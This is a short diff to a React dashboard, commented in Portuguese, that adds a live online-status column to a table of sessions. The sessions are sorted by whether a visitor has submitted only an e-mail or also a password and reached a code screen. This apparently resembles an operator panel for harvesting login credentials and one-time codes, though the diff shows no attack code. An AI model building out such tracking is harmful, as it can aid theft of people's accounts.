@@ -411,6 +411,7 @@ export default function Dashboard() {
               <table className="w-full text-sm">
                 <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
                   <tr>
+                    <th className="px-4 py-3 text-left font-medium">Status</th>
                     <th className="px-4 py-3 text-left font-medium">Última atividade</th>
                     <th className="px-4 py-3 text-left font-medium">
                       <span className="inline-flex items-center gap-1"><Mail className="h-3 w-3" /> E-mail</span>
@@ -431,8 +432,12 @@ export default function Dashboard() {
                     // - tem senha → já passou da escolha, está na tela do código
                     // - só tem e-mail → na tela de escolha (senha ou código)
                     const screenLabel = hasPassword ? "Tela código" : "Tela escolha";
+                    const isOnline = onlineSessionIds.has(s.session_id);
                     return (
                       <tr key={s.session_id} className="border-t border-border hover:bg-muted/30">
+                        <td className="whitespace-nowrap px-4 py-3 text-xs">
+                          <StatusDot online={isOnline} />
+                        </td>
                         <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                           {formatTime(s.lastActivity)}
                         </td>
